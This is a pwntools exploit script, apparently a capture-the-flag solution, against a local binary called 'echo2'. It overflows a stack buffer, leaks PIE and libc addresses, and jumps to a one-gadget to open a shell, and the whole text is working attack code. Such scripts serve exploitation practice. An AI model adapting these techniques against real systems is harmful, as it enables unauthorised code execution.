from pwn import *

target = process('./echo2')

pid = gdb.attach(target, 'b *echo+125\ncontinue')

elf = ELF('echo2')
libc = ELF('libc.so.6')

print(target.recvuntil(b'Echo2\n'))

#Note: we have a persistent I/O issue whereby the newline from the scanf is being read by the fgets call. It was easiest to just compensate by decrementing padding length by one.
padding = b'a' * 279
payload = padding + b'\x4c'

target.sendline(str(len(payload)+1))

target.send(payload)

print(target.recvuntil(b'Echo2: '))

print(target.recv(280))
leak = target.recv(6)
print(leak)
main = u64(leak + b'\x00' * 2) - 5
print(hex(main))
pie_base = main - elf.symbols['main']

payload2 = padding
payload2 += p64(pie_base + elf.symbols['puts'])
payload2 += p64(pie_base + elf.symbols['echo'])
target.sendline(str(len(payload2)+1))
target.send(payload2)

print(target.recvuntil(b'Echo2: '))
print(target.recv(287))
leak = (target.recv(6))

funlockfile = (u64(leak+b'\x00' * 2))
libc_base = funlockfile - libc.symbols['funlockfile']
execve = libc_base + libc.symbols['execve']
print(hex(execve))
onegadget = libc_base + 0xebcf5

payload3 = b'b' * (279 - 8) + p64(pie_base + elf.bss() + 0x78)
payload3 += p64(onegadget)
target.sendline(str(len(payload3)+1))
target.send(payload3)

target.interactive()